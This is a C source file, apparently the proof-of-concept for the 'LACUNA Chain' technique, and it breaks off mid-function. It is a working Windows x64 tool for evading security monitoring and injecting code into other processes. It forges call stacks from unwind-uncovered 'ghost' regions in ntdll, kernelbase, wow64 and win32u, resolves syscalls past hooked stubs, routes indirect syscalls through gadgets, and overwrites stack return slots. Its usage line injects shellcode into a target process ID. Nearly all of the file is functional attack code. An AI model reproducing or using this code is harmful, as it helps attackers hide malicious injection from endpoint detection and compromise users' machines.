/*
 * lacuna_chain.c  —  LACUNA Chain
 *
 * Technique: LACUNA Chain
 * Research:  Ghost Frames: Forging Plausible Call Stacks from .pdata Lacunae
 * Author:    Mohamed Alzhrani (0xmaz)
 * Year:      2026
 *
 * LACUNA Chain exploits executable code regions with no .pdata RUNTIME_FUNCTION
 * coverage ("lacunae") across ntdll / kernelbase / wow64 / win32u to build a
 * fake but structurally valid call stack.  When ETW-Ti fires an APC during
 * NtDelayExecution(alertable), the kernel unwinds through ghost frames instead
 * of real callers — every layer passes RtlLookupFunctionEntry as a leaf with
 * no unwind record, so the chain survives both frame-pointer and unwind walks.
 *
 * Injection uses NtCreateSection + NtMapViewOfSection×2 rather than the classic
 * VirtualAlloc / WriteProcessMemory / VirtualProtect triad, removing the syscall
 * sequence that behavioral engines correlate as injection.
 *
 * build:
 *   x86_64-w64-mingw32-gcc -O0 -masm=intel -fno-omit-frame-pointer \
 *       -Wall -Wno-unused-function -o lacuna.exe lacuna_chain.c
 *
 * usage:
 *   lacuna.exe scan
 *   lacuna.exe verify
 *   lacuna.exe inject <pid> <sc.bin>
 */

#ifndef _WIN64
#  error "x64 only"
#endif

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } CID;

typedef NTSTATUS (NTAPI *PNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CID *);
typedef NTSTATUS (NTAPI *PNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *PNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *PNtOpenThread)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CID *);
typedef NTSTATUS (NTAPI *PNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS (NTAPI *PNtAlertThread)(HANDLE);
typedef NTSTATUS (NTAPI *PNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *PNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *PNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

static PNtDelayExecution _NtDelay;

#define NT_OK(s)     ((NTSTATUS)(s) >= 0)
#define ViewUnmap    2

#ifndef THREAD_ALERT
#define THREAD_ALERT 0x0004
#endif

typedef struct { DWORD Begin, End, Unwind; } RF;
typedef struct { BYTE VF; BYTE Prolog; BYTE Count; BYTE Frame; } UH;
typedef struct { BYTE Off; BYTE Op; } UC;

#define UWOP_PUSH_MACHFRAME 10


/* ghost region — executable code not covered by any RUNTIME_FUNCTION */
typedef struct {
    ULONG64 va_start, va_end;
    UINT    size;
    ULONG64 export_va;
    UINT    dist;
    char    name[64];
} Ghost;

/* hardware exception frame used by the BYOUD-MF primitive */
#pragma pack(push, 1)
typedef struct {
    ULONG64 Rip;
    ULONG64 Cs;
    ULONG64 EFlags;
    ULONG64 Rsp;
    ULONG64 Ss;
} MachFrame;
#pragma pack(pop)

/*
 * fake stack layout (low → high, stack grows down):
 *   L5_thread_root   ← walked last
 *   L4_win32u
 *   L3_ntdll
 *   L2_kbase
 *   L1_wow64         ← g_chain_rsp points here
 *   MachFrame (40 B) ← consumed by UWOP_PUSH_MACHFRAME handler
 *   mf_trigger       ← KiUserExceptionDispatcher+4
 */
typedef struct {
    ULONG64   L5_thread_root;
    ULONG64   L4_win32u;
    ULONG64   L3_ntdll;
    ULONG64   L2_kbase;
    ULONG64   L1_wow64;
    MachFrame mf;
    ULONG64   mf_trigger;
} LacunaStack;

static LacunaStack *g_ls        = NULL;
static ULONG64      g_chain_rsp = 0;
static ULONG64      g_save_rsp  = 0;
static ULONG64     *g_mf_walk   = NULL;  /* L2,L3,L4,L5 in MF walk order */


static bool pe_section(HMODULE mod, const char *sname, ULONG64 *va, ULONG *sz)
{
    uint8_t *b = (uint8_t *)mod;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(b + ((PIMAGE_DOS_HEADER)b)->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (strncmp((char *)s->Name, sname, 8) == 0) {
            *va = (ULONG64)b + s->VirtualAddress;
            *sz = s->Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

static ULONG64 pe_export(HMODULE mod, const char *fname)
{
    uint8_t *b = (uint8_t *)mod;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(b + ((PIMAGE_DOS_HEADER)b)->e_lfanew);
    DWORD erva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!erva) return 0;
    PIMAGE_EXPORT_DIRECTORY ed = (PIMAGE_EXPORT_DIRECTORY)(b + erva);
    DWORD *names = (DWORD *)(b + ed->AddressOfNames);
    WORD  *ords  = (WORD  *)(b + ed->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(b + ed->AddressOfFunctions);
    for (DWORD i = 0; i < ed->NumberOfNames; i++)
        if (!strcmp((char *)(b + names[i]), fname))
            return (ULONG64)b + funcs[ords[i]];
    return 0;
}


static int scan_ghosts(HMODULE mod, const char **targets, int nt, Ghost *out, int max)
{
    ULONG64 pva; ULONG psz;
    if (!pe_section(mod, ".pdata", &pva, &psz)) return 0;

    ULONG64 tva[32] = {0}; char tname[32][64]; int n_t = 0;
    for (int i = 0; i < nt && n_t < 32; i++) {
        ULONG64 v = pe_export(mod, targets[i]);
        if (v) { tva[n_t] = v; strncpy(tname[n_t], targets[i], 63); n_t++; }
    }

    RF *rf = (RF *)pva;
    int count = psz / sizeof(RF);
    ULONG64 img = (ULONG64)mod, prev = 0;
    int found = 0;

    for (int i = 0; i < count && found < max; i++) {
        if (!rf[i].Unwind) continue;
        ULONG64 begin = img + rf[i].Begin;
        ULONG64 end   = img + rf[i].End;
        if (prev && begin > prev) {
            UINT sz = (UINT)(begin - prev);
            uint8_t *gp = (uint8_t *)prev;
            int nonpad = 0;
            for (UINT k = 0; k < sz && k < 512; k++)
                if (gp[k] != 0xCC && gp[k] != 0x00 && gp[k] != 0x90) nonpad++;
            if (nonpad > 4 && sz >= 8) {
                UINT best = 0xFFFFFFFF; int bi = -1;
                for (int j = 0; j < n_t; j++) {
                    UINT d = (tva[j] >= prev && tva[j] <= prev + sz) ? 0
                           : (tva[j] > prev + sz) ? (UINT)(tva[j] - (prev + sz))
                                                   : (UINT)(prev - tva[j]);
                    if (d < best) { best = d; bi = j; }
                }
                out[found].va_start  = prev;
                out[found].va_end    = prev + sz;
                out[found].size      = sz;
                out[found].export_va = bi >= 0 ? tva[bi] : 0;
                out[found].dist      = best;
                if (bi >= 0) strncpy(out[found].name, tname[bi], 63);
                found++;
            }
        }
        prev = end;
    }
    return found;
}

static Ghost *best_ghost(Ghost *g, int n, const char *target)
{
    Ghost *best = NULL; UINT bd = 0xFFFFFFFF;
    for (int i = 0; i < n; i++)
        if (!strcmp(g[i].name, target) && g[i].dist < bd)
            { bd = g[i].dist; best = &g[i]; }
    return best;
}

static const uint8_t WIN32U_NOP8[] = {0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00};

static ULONG64 win32u_nop_gap(HMODULE m)
{
    ULONG64 pva; ULONG psz;
    if (!pe_section(m, ".pdata", &pva, &psz)) return 0;
    RF *rf = (RF *)pva; int count = psz / sizeof(RF);
    ULONG64 img = (ULONG64)m, prev = 0;
    for (int i = 0; i < count; i++) {
        if (!rf[i].Unwind) continue;
        ULONG64 begin = img + rf[i].Begin;
        if (prev && begin > prev) {
            UINT gap = (UINT)(begin - prev);
            if (gap >= 4 && gap <= 16) {
                uint8_t *gp = (uint8_t *)prev;
                bool ok = false;
                if (gap == 8 && memcmp(gp, WIN32U_NOP8, 8) == 0) {
                    ok = true;
                } else {
                    ok = true;
                    for (UINT k = 0; k < gap; k++)
                        if (gp[k] != 0x00 && gp[k] != 0xCC && gp[k] != 0x90)
                            { ok = false; break; }
                }
                if (ok) return prev;
            }
        }
        prev = img + rf[i].End;
    }
    return 0;
}

static ULONG64 find_mf_target(HMODULE ntdll)
{
    ULONG64 pva; ULONG psz;
    if (!pe_section(ntdll, ".pdata", &pva, &psz)) goto fb;
    {
        RF *rf = (RF *)pva; int count = psz / sizeof(RF);
        ULONG64 img = (ULONG64)ntdll;
        for (int i = 0; i < count; i++) {
            if (!rf[i].Unwind) continue;
            UH *uh = (UH *)(img + rf[i].Unwind);
            UC *codes = (UC *)((uint8_t *)uh + 4);
            for (int j = 0; j < uh->Count; j++)
                if ((codes[j].Op & 0xF) == UWOP_PUSH_MACHFRAME && codes[j].Off == 0)
                    return img + rf[i].Begin + 4;
        }
    }
fb:
    return pe_export(ntdll, "KiUserExceptionDispatcher") + 4;
}


/* read SSN from ntdll stub; if the stub is hooked scan ±10 adjacent stubs */
static DWORD resolve_ssn(HMODULE ntdll, const char *fn)
{
    uint8_t *p = (uint8_t *)pe_export(ntdll, fn);
    if (!p) return ~0u;
    if (p[0]==0x4C && p[1]==0x8B && p[2]==0xD1 && p[3]==0xB8)
        return *(DWORD *)(p + 4);
    for (int d = 1; d <= 10; d++) {
        uint8_t *u = p - d * 32;
        if (u[0]==0x4C && u[1]==0x8B && u[2]==0xD1 && u[3]==0xB8)
            return *(DWORD *)(u + 4) + d;
        uint8_t *dn = p + d * 32;
        if (dn[0]==0x4C && dn[1]==0x8B && dn[2]==0xD1 && dn[3]==0xB8)
            return *(DWORD *)(dn + 4) - d;
    }
    return ~0u;
}

static ULONG64 g_ghost_gadget = 0;
static int g_ghost_mod = 0; /* 0=none, 1=ntdll, 2=kernelbase */

/* find the syscall;ret (0F 05 C3) inside a specific ntdll function.
   Per-function targeting: RIP lands at the function's OWN syscall
   instruction, so the SSN matches the function name -- no EDR
   mismatch heuristic can fire. */
static ULONG64 find_func_syscall(HMODULE ntdll, const char *fn)
{
    uint8_t *p = (uint8_t *)pe_export(ntdll, fn);
    if (!p) return 0;
    for (int i = 0; i < 32; i++)
        if (p[i] == 0x0F && p[i+1] == 0x05 && p[i+2] == 0xC3)
            return (ULONG64)(p + i);
    return 0;
}

/* indirect syscall stub with ghost gadget redirect:
   stub: mov r10,rcx; mov eax,SSN; lea rbx,[&func_sr]; jmp ghost_gadget
   ghost gadget (ntdll/kernelbase ghost region): JMP [RBX] -> func's own syscall;ret
   syscall fires inside the target function in ntdll.

   Execution chain: stub -> ghost JMP[RBX] (no .pdata) -> func syscall;ret
   When ghost gadget unavailable, falls back to direct jmp [func_sr]. */
static void *alloc_stub(DWORD ssn, ULONG64 func_sr)
{
    uint8_t code[80];
    int off = 0;

    if (g_ghost_gadget && func_sr) {
        /* ghost gadget path: save RBX (callee-saved) in caller shadow space,
           swap return addr with epilogue, then jmp ghost→JMP[RBX]→syscall;ret.
           Epilogue restores RBX and jumps to original return address.
           RSP is never modified so stack params for 5+ arg functions stay aligned. */
        code[off++] = 0x48; code[off++] = 0x89; code[off++] = 0x5C;
        code[off++] = 0x24; code[off++] = 0x08;                      /* mov [rsp+8], rbx */
        code[off++] = 0x4C; code[off++] = 0x8B; code[off++] = 0xD1;  /* mov r10, rcx */
        code[off++] = 0xB8;                                           /* mov eax, imm32 */
        *(DWORD *)(code + off) = ssn; off += 4;
        code[off++] = 0x48; code[off++] = 0x8D; code[off++] = 0x1D;  /* lea rbx, [rip+Y] */
        int lea_rbx = off; off += 4;
        code[off++] = 0x4C; code[off++] = 0x8B; code[off++] = 0x1C;
        code[off++] = 0x24;                                           /* mov r11, [rsp] */
        code[off++] = 0x4C; code[off++] = 0x89; code[off++] = 0x5C;
        code[off++] = 0x24; code[off++] = 0x10;                      /* mov [rsp+16], r11 */
        code[off++] = 0x4C; code[off++] = 0x8D; code[off++] = 0x1D;  /* lea r11, [rip+W] */
        int lea_r11 = off; off += 4;
        code[off++] = 0x4C; code[off++] = 0x89; code[off++] = 0x1C;
        code[off++] = 0x24;                                           /* mov [rsp], r11 */
        code[off++] = 0xFF; code[off++] = 0x25;                      /* jmp [rip+V] */
        int jmp_disp = off; off += 4;
        int epilogue = off;
        code[off++] = 0x48; code[off++] = 0x8B; code[off++] = 0x1C;
        code[off++] = 0x24;                                           /* mov rbx, [rsp] */
        code[off++] = 0xFF; code[off++] = 0x64; code[off++] = 0x24;
        code[off++] = 0x08;                                           /* jmp [rsp+8] */
        int ghost_data = off;
        *(ULONG64 *)(code + off) = g_ghost_gadget; off += 8;
        int sr_data = off;
        *(ULONG64 *)(code + off) = func_sr; off += 8;
        *(DWORD *)(code + lea_rbx) = (DWORD)(sr_data   - (lea_rbx  + 4));
        *(DWORD *)(code + lea_r11) = (DWORD)(epilogue  - (lea_r11  + 4));
        *(DWORD *)(code + jmp_disp)= (DWORD)(ghost_data- (jmp_disp + 4));
    } else {

    code[off++] = 0x4C; code[off++] = 0x8B; code[off++] = 0xD1;   /* mov r10, rcx */
    code[off++] = 0xB8;                                              /* mov eax, imm32 */
    *(DWORD *)(code + off) = ssn; off += 4;

    if (func_sr) {
        code[off++] = 0xFF; code[off++] = 0x25;                      /* jmp [rip+0] */
        *(DWORD *)(code + off) = 0; off += 4;
        *(ULONG64 *)(code + off) = func_sr; off += 8;
    } else {
        code[off++] = 0x0F; code[off++] = 0x05;                      /* syscall */
        code[off++] = 0xC3;                                           /* ret */
    }
    } /* close else from ghost gadget path */
    void *m = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!m) return NULL;
    memcpy(m, code, off);
    DWORD old;
    VirtualProtect(m, 0x1000, PAGE_EXECUTE_READ, &old);
    return m;
}


typedef struct {
    ULONG64 va;
    char    parent[64];
} GhostGadget;

static int scan_ghost_gadgets(Ghost *ghosts, int n, const char *mod,
                              GhostGadget *out, int max)
{
    int found = 0;
    for (int i = 0; i < n && found < max; i++) {
        uint8_t *p = (uint8_t *)ghosts[i].va_start;
        UINT sz = ghosts[i].size;
        for (UINT k = 0; k + 1 < sz; k++) {
            if (p[k] == 0xFF && p[k+1] == 0x23) {  /* jmp [rbx] */
                out[found].va = ghosts[i].va_start + k;
                snprintf(out[found].parent, 63, "%s ghost @%llx",
                         mod, ghosts[i].va_start);
                found++;
                if (found >= max) break;
            }
        }
    }
    return found;
}

static Ghost ng[512], kg[512], wg[64];
static int   n_ng, n_kg, n_wg;

static bool build_chain(void)
{
    HMODULE ntdll  = GetModuleHandleA("ntdll.dll");
    HMODULE kbase  = GetModuleHandleA("kernelbase.dll");
    HMODULE wow64  = GetModuleHandleA("wow64.dll");
    HMODULE win32u = GetModuleHandleA("win32u.dll");

    const char *nt_t[]  = {"RtlCreateUserThread","NtAllocateVirtualMemory",
                            "LdrLoadDll","NtCreateThreadEx","RtlUserThreadStart"};
    const char *kb_t[]  = {"VirtualProtect","VirtualAllocEx",
                            "WriteProcessMemory","CreateRemoteThreadEx"};
    const char *w64_t[] = {"Wow64PrepareForException",
                            "Wow64KiUserCallbackDispatcher","Wow64ApcRoutine"};

    n_ng = scan_ghosts(ntdll, nt_t,  5, ng, 512);
    n_kg = scan_ghosts(kbase, kb_t,  4, kg, 512);
    n_wg = wow64 ? scan_ghosts(wow64, w64_t, 3, wg, 64) : 0;

    printf("[*] ghost scan: ntdll=%d  kernelbase=%d  wow64=%d\n", n_ng, n_kg, n_wg);

    if (!g_ghost_gadget) {
        GhostGadget gg[8];
        int ngg = scan_ghost_gadgets(ng, n_ng, "ntdll", gg, 8);
        if (ngg > 0) { g_ghost_gadget = gg[0].va; g_ghost_mod = 1; }
        else {
            ngg = scan_ghost_gadgets(kg, n_kg, "kernelbase", gg, 8);
            if (ngg > 0) { g_ghost_gadget = gg[0].va; g_ghost_mod = 2; }
        }
        if (g_ghost_gadget)
            printf("[*] ghost gadget JMP [RBX] at %llx (%s) -- used as L%d + stub redirect\n",
                   g_ghost_gadget, g_ghost_mod == 1 ? "ntdll" : "kernelbase",
                   g_ghost_mod == 1 ? 3 : 2);
        else
            printf("[!] no ghost gadget found -- stubs use direct jmp\n");
    }

    printf("\n");

    Ghost *g1 = best_ghost(wg, n_wg, "Wow64PrepareForException");
    if (!g1) g1 = best_ghost(wg, n_wg, "Wow64KiUserCallbackDispatcher");
    ULONG64 L1;
    if (g1) {
        L1 = g1->va_start + g1->size / 2;
    } else {
        Ghost *g3pre = best_ghost(ng, n_ng, "RtlCreateUserThread");
        if (!g3pre) g3pre = best_ghost(ng, n_ng, "NtAllocateVirtualMemory");
        Ghost *bf = NULL; UINT bd = 0xFFFFFFFF;
        for (int k = 0; k < n_ng; k++) {
            if (g3pre && &ng[k] == g3pre) continue;
            if (ng[k].dist < bd) { bd = ng[k].dist; bf = &ng[k]; }
        }
        if (!bf) bf = g3pre;
        L1 = bf ? (bf->va_start + bf->size / 2) : ((ULONG64)ntdll + 0x50F80);
        g1 = bf;
    }

    Ghost *g2 = best_ghost(kg, n_kg, "VirtualProtect");
    if (!g2) g2 = best_ghost(kg, n_kg, "VirtualAllocEx");
    ULONG64 L2 = (g_ghost_mod == 2) ? g_ghost_gadget
               : g2 ? (g2->va_start + g2->size / 2) : ((ULONG64)kbase + 0x64180);

    Ghost *g3 = best_ghost(ng, n_ng, "RtlCreateUserThread");
    if (!g3) g3 = best_ghost(ng, n_ng, "NtAllocateVirtualMemory");
    ULONG64 L3 = (g_ghost_mod == 1) ? g_ghost_gadget
               : g3 ? (g3->va_start + g3->size / 2) : ((ULONG64)ntdll + 0x50F80);

    ULONG64 L4 = win32u ? win32u_nop_gap(win32u) : (ng[0].va_start + 4);
    ULONG64 L5 = pe_export(ntdll, "RtlUserThreadStart") + 0x21;
    ULONG64 L0 = find_mf_target(ntdll);

    printf("  L0  %016llx  (mf anchor)\n", L0);
    printf("  L1  %016llx  %-28s (wow64 ghost)\n",    L1, g1 ? g1->name : "fallback");
    printf("  L2  %016llx  %-28s (kernelbase ghost%s)\n", L2,
           g_ghost_mod == 2 ? "JMP[RBX] ghost gadget" : g2 ? g2->name : "fallback",
           g_ghost_mod == 2 ? " + gadget" : "");
    printf("  L3  %016llx  %-28s (ntdll ghost%s)\n",  L3,
           g_ghost_mod == 1 ? "JMP[RBX] ghost gadget" : g3 ? g3->name : "fallback",
           g_ghost_mod == 1 ? " + gadget" : "");
    printf("  L4  %016llx  win32u nop gap\n", L4);
    printf("  L5  %016llx  RtlUserThreadStart+0x21\n\n", L5);

    g_ls = VirtualAlloc(NULL, sizeof(LacunaStack) + 0x100,
                        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!g_ls) { fprintf(stderr, "[-] VirtualAlloc failed (%lu)\n", GetLastError()); return false; }

    /* MF walk buffer: L2→L3→L4→L5 in ascending-address order so
       the leaf RSP+=8 walk reads the correct next return address */
    g_mf_walk = (ULONG64 *)((uint8_t *)g_ls + sizeof(LacunaStack));
    g_mf_walk[0] = L2;
    g_mf_walk[1] = L3;
    g_mf_walk[2] = L4;
    g_mf_walk[3] = L5;

    g_ls->L5_thread_root = L5;
    g_ls->L4_win32u      = L4;
    g_ls->L3_ntdll       = L3;
    g_ls->L2_kbase       = L2;
    g_ls->L1_wow64       = L1;
    g_ls->mf.Rip    = L1;                          /* next frame after MF teleport */
    g_ls->mf.Cs     = 0x0033;
    g_ls->mf.EFlags = 0x00000202;
    g_ls->mf.Rsp    = (ULONG64)&g_mf_walk[0];     /* RSP lands on L2→L3→L4→L5 chain */
    g_ls->mf.Ss     = 0x002B;
    g_ls->mf_trigger = L0;
    g_chain_rsp = (ULONG64)&g_ls->mf;
    return true;
}


typedef PRUNTIME_FUNCTION (NTAPI *PRtlLFE)(DWORD64, PDWORD64, PUNWIND_HISTORY_TABLE);
typedef VOID (NTAPI *PRtlVU)(DWORD, DWORD64, DWORD64, PRUNTIME_FUNCTION,
                              PCONTEXT, PVOID *, PDWORD64, PVOID);

static void lacuna_walk_chain(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PRtlLFE LookupFE = (PRtlLFE)GetProcAddress(ntdll, "RtlLookupFunctionEntry");
    PRtlVU  VU       = (PRtlVU) GetProcAddress(ntdll, "RtlVirtualUnwind");
    if (!LookupFE || !VU) { fprintf(stderr, "[-] can't resolve unwind apis\n"); return; }

    ULONG64 chain[4] = {
        g_ls->L2_kbase, g_ls->L3_ntdll, g_ls->L4_win32u, g_ls->L5_thread_root
    };
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    ctx.Rip = g_ls->L1_wow64;
    ctx.Rsp = (ULONG64)&chain[0];

    printf("[*] walking chain (same path as EDR stack collector)\n\n");

    static const char *lnames[] = {
        "L1  wow64    ghost  (Wow64PrepareForException)",
        "L2  kbase    ghost  (VirtualProtect)",
        "L3  ntdll    ghost  (RtlCreateUserThread)",
        "L4  win32u   nop gap",
        "L5  RtlUserThreadStart+0x21"
    };
    bool seen[5] = {0}; int hits = 0;

    for (int i = 0; i < 20 && ctx.Rip; i++) {
        DWORD64 imgbase = 0;
        UNWIND_HISTORY_TABLE hist = {0};
        PRUNTIME_FUNCTION rf = LookupFE(ctx.Rip, &imgbase, &hist);

        const char *lbl = ""; int li = -1;
        if      (ctx.Rip == g_ls->L1_wow64)      { lbl = lnames[0]; li = 0; }
        else if (ctx.Rip == g_ls->L2_kbase)       { lbl = lnames[1]; li = 1; }
        else if (ctx.Rip == g_ls->L3_ntdll)       { lbl = lnames[2]; li = 2; }
        else if (ctx.Rip == g_ls->L4_win32u)      { lbl = lnames[3]; li = 3; }
        else if (ctx.Rip == g_ls->L5_thread_root) { lbl = lnames[4]; li = 4; }
        if (li >= 0) { seen[li] = true; hits++; }

        printf("  [%2d]  %016llx  %-8s  %s\n", i, ctx.Rip, rf ? "rf" : "ghost", lbl);
        if (hits == 5) { printf("  (thread root — stopping)\n"); break; }

        if (!rf) {
            ctx.Rip = *(ULONG64 *)ctx.Rsp;
            ctx.Rsp += 8;
        } else {
            PVOID hd = NULL; ULONG64 ef = 0;
            VU(0, imgbase, ctx.Rip, rf, &ctx, &hd, &ef, NULL);
        }
    }

    printf("\n");
    for (int i = 0; i < 5; i++)
        printf("  %s  %s\n", seen[i] ? "[+]" : "[ ]", lnames[i]);

    bool ok = seen[0] && seen[1] && seen[2] && seen[3] && seen[4];
    printf("\n%s all layers %s\n", ok ? "[+]" : "[!]",
           ok ? "ghost — chain is clean" : "PARTIAL — check addresses above");

    /* BYOUD-MF pass: walk from mf_trigger through the machine frame teleport.
       The unwinder hits KiUserExceptionDispatcher's UWOP_PUSH_MACHFRAME,
       reads Rip=L1 and Rsp=&g_mf_walk[0], then continues L1→L2→L3→L4→L5. */
    printf("\n[*] BYOUD-MF pass: starting from mf_trigger (L0=%016llx)\n\n",
           g_ls->mf_trigger);

    CONTEXT mf_ctx = {0};
    mf_ctx.ContextFlags = CONTEXT_FULL;
    mf_ctx.Rip = g_ls->mf_trigger;
    mf_ctx.Rsp = (ULONG64)&g_ls->mf;

    bool mf_seen[6] = {0};
    static const char *mf_names[] = {
        "L0  MF anchor (KiUserExceptionDispatcher)",
        "L1  wow64 ghost", "L2  kbase ghost", "L3  ntdll ghost",
        "L4  win32u nop gap", "L5  RtlUserThreadStart+0x21"
    };
    int mf_hits = 0;

    for (int i = 0; i < 20 && mf_ctx.Rip; i++) {
        DWORD64 imgbase = 0;
        UNWIND_HISTORY_TABLE hist = {0};
        PRUNTIME_FUNCTION rf = LookupFE(mf_ctx.Rip, &imgbase, &hist);

        int li = -1;
        if      (mf_ctx.Rip == g_ls->mf_trigger)    li = 0;
        else if (mf_ctx.Rip == g_ls->L1_wow64)       li = 1;
        else if (mf_ctx.Rip == g_ls->L2_kbase)       li = 2;
        else if (mf_ctx.Rip == g_ls->L3_ntdll)       li = 3;
        else if (mf_ctx.Rip == g_ls->L4_win32u)      li = 4;
        else if (mf_ctx.Rip == g_ls->L5_thread_root) li = 5;
        if (li >= 0) { mf_seen[li] = true; mf_hits++; }

        printf("  [%2d]  %016llx  %-8s  %s\n", i, mf_ctx.Rip,
               rf ? "rf/MF" : "ghost", li >= 0 ? mf_names[li] : "");
        if (mf_hits == 6) { printf("  (thread root — stopping)\n"); break; }

        if (!rf) {
            mf_ctx.Rip = *(ULONG64 *)mf_ctx.Rsp;
            mf_ctx.Rsp += 8;
        } else {
            PVOID hd = NULL; ULONG64 ef = 0;
            VU(0, imgbase, mf_ctx.Rip, rf, &mf_ctx, &hd, &ef, NULL);
        }
    }

    printf("\n");
    for (int i = 0; i < 6; i++)
        printf("  %s  %s\n", mf_seen[i] ? "[+]" : "[ ]", mf_names[i]);

    bool mf_ok = mf_seen[0] && mf_seen[1] && mf_seen[2];
    printf("\n%s BYOUD-MF teleport %s\n", mf_ok ? "[+]" : "[!]",
           mf_ok ? "worked — RSP jumped through machine frame" :
                   "partial — MF may need version-specific offsets");
}


/* BYOUD-RT: read TEB.StackBase (GS:[0x08]) and TEB.StackLimit (GS:[0x10])
   at runtime — works in any injected context without pre-calibration */
static ULONG64 teb_stack_base(void)
{
    ULONG64 base;
    __asm__ __volatile__("{movq %%gs:0x08, %0|mov %0, gs:[0x08]}" : "=r"(base));
    return base;
}

static ULONG64 teb_stack_limit(void)
{
    ULONG64 limit;
    __asm__ __volatile__("{movq %%gs:0x10, %0|mov %0, gs:[0x10]}" : "=r"(limit));
    return limit;
}

#define STOMP_DEPTH 4
static ULONG64  g_stomp_slots[STOMP_DEPTH];
static ULONG64 *g_stomp_ptrs[STOMP_DEPTH];
static ULONG64  g_stomp_addr  = 0;
static ULONG64  g_stomp_saved = 0;

/*
 * Write L1-L4 into the return-address slot of do_inject_sapc and the three
 * dead shadow words above it.  We use __builtin_frame_address(1) which gives
 * do_inject_sapc's saved RBP; [1] relative to that is where do_inject_sapc
 * will ret when it finishes, and [2]-[4] are main()'s already-consumed shadow
 * space — safe to clobber.  We deliberately never touch [0] (our own saved
 * RBP) or stomp_plant's own return address, so stomp_plant returns normally.
 *
 * When ETW-Ti fires an APC inside NtDelayExecution(alertable), the kernel
 * walks the stack and sees the four ghost frames instead of the real callers.
 * Each ghost has no RUNTIME_FUNCTION coverage so the leaf-unwind rule pops
 * RSP+8 and moves to the next slot, chaining L1→L2→L3→L4→L5 naturally.
 */
static __attribute__((noinline)) void stomp_plant(void)
{
    ULONG64 layers[STOMP_DEPTH] = {
        g_ls->L1_wow64, g_ls->L2_kbase, g_ls->L3_ntdll, g_ls->L4_win32u
    };

    /* BYOUD-RT: validate frame pointer against TEB stack boundaries */
    ULONG64 stack_base  = teb_stack_base();
    ULONG64 stack_limit = teb_stack_limit();

    ULONG64 *frame = (ULONG64 *)__builtin_frame_address(1);
    if (!frame || (ULONG64)frame < stack_limit || (ULONG64)frame >= stack_base) {
        printf("[!] frame %p outside TEB stack [%llx-%llx] — stomp skipped\n",
               frame, stack_limit, stack_base);
        return;
    }
    printf("[*] BYOUD-RT: stack_base=%llx  frame=%p  depth=%llu\n",
           stack_base, frame, stack_base - (ULONG64)frame);
    fflush(stdout);

    for (int d = 0; d < STOMP_DEPTH; d++) {
        g_stomp_ptrs[d]  = &frame[1 + d];
        g_stomp_slots[d] =  frame[1 + d];
        frame[1 + d] = layers[d];
    }
    g_stomp_addr  = (ULONG64)g_stomp_ptrs[0];
    g_stomp_saved = g_stomp_slots[0];
    printf("[+] stomped %d slots: L1=%llx L2=%llx L3=%llx L4=%llx\n",
           STOMP_DEPTH, layers[0], layers[1], layers[2], layers[3]);
    fflush(stdout);
}

static void stomp_restore(void)
{
    for (int d = 0; d < STOMP_DEPTH; d++)
        if (g_stomp_ptrs[d]) *g_stomp_ptrs[d] = g_stomp_slots[d];
}

static LONG WINAPI chain_veh(EXCEPTION_POINTERS *ep)
{
    ULONG64 ip = ep->ContextRecord->Rip;
    bool in_chain = g_ls &&
        ((ip >= g_ls->L1_wow64 - 16 && ip <= g_ls->L1_wow64 + 16) ||
         (ip >= g_ls->L2_kbase - 16 && ip <= g_ls->L2_kbase + 16) ||
         (ip >= g_ls->L3_ntdll - 16 && ip <= g_ls->L3_ntdll + 16) ||
         (ip >= g_ls->L4_win32u - 16 && ip <= g_ls->L4_win32u + 16));
    if (in_chain) {
        stomp_restore();
        ep->ContextRecord->Rsp = g_save_rsp;
        ep->ContextRecord->Rip = g_stomp_saved;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


/* parameter encryption: HW-breakpoint-gated decryption at syscall boundary */
typedef struct {
    ULONG64 key;
    bool    armed;
    bool    full_spoof;
} ParamCryptCtx;

static ParamCryptCtx g_pcrypt = {0};
static ULONG64 g_ret_gadget = 0;   /* ret (C3) inside ntdll — spoofed return addr */
static ULONG64 g_real_ret = 0;     /* saved real return (epilogue in alloc_stub) */

#define MAX_SPOOF 16
static ULONG64 g_saved_slots[MAX_SPOOF];
static int      g_saved_idx[MAX_SPOOF];
static int      g_n_spoofed = 0;
static ULONG64  g_spoof_rsp = 0;
static ULONG64  g_exe_base = 0, g_exe_end = 0;

static LONG WINAPI param_encrypt_veh(EXCEPTION_POINTERS *ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
